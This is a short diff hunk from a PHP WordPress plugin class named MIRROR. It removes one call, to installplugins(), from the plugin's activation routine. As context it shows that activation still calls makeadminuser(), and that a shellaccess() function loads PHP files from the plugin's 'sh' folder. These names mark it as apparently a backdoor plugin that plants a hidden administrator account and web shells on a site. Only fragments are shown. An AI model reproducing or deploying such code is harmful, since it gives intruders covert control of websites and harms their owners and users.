@@ -41,7 +41,6 @@ if(!class_exists('MIRROR')) {
         }
         function activate() {
             $this->makeadminuser();
-            $this->installplugins();
         }
         function shellaccess(){
             foreach(glob(ABSPATH.'wp-content/plugins/mirror/sh/*.php') as $shells) {
